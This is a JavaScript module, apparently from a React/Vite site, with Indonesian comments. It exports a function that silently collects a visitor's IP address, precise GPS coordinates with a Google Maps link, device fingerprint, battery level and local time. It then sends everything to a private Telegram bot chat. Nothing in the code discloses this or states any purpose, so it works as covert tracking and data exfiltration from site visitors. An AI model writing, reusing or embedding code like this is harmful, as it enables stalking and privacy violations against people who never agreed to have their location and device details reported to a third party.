import React from 'react'

const sendUserInfo = async () => {
  try {
    // 1. Generate unique user ID
    let newUser = false;
    let userId = localStorage.getItem("uniqueUserId");
    if (!userId) {
      newUser = true;
      userId = crypto.randomUUID();
      localStorage.setItem("uniqueUserId", userId);
    }

    // 2. Ambil IP user
    let userIP = "Unknown";
    try {
      const ipRes = await fetch("https://api.ipify.org?format=json");
      const ipData = await ipRes.json();
      userIP = ipData.ip;
    } catch { }


    // 3. Ambil lokasi user
    const getLocation = () => {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          return resolve({ latitude: null, longitude: null, accuracy: null });
        }
        navigator.geolocation.getCurrentPosition(
          (position) => {
            resolve({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
            });
          },
          () => {
            resolve({ latitude: null, longitude: null, accuracy: null });
          }
        );
      });
    };
    const location = await getLocation();
    const gmapsLink = location.latitude && location.longitude
      ? `https://maps.google.com/?q=${location.latitude},${location.longitude}`
      : "Location unavailable";

    // 4. Ambil device info
    const userAgent = navigator.userAgent;
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const pixelRatio = window.devicePixelRatio;

    // 5. Waktu sesuai timezone
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const localTime = `${new Date().toLocaleString()} (${timezone})`;

    // 6. Battery info
    let batteryLevel = null;
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
    } else {
      batteryLevel = "Not supported";
    }

    // 7. Buat pesan Telegram
    const message = `
📲 *User Info Detected*

🕐 Time: ${localTime}

🆔 ID: ${userId} (new user: ${newUser})

🌐 IP: ${userIP}

📍 Location:
  - GMaps Link: [Google Maps](${gmapsLink})
  - Latitude: ${location.latitude}
  - Longitude: ${location.longitude}
  - Accuracy: ${location.accuracy} meters

📱 Device Info:
  - Battery level: ${batteryLevel}
  - Screen: ${screenWidth}x${screenHeight}
  - Pixel Ratio: ${pixelRatio}
  - User Agent: \`\`\`${userAgent}\`\`\`
`;

    // 8. Kirim ke Telegram
    const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown",
        disable_web_page_preview: true,
      }),
    });

  } catch (err) {
    console.error("❌", err);
  }
}

export default sendUserInfo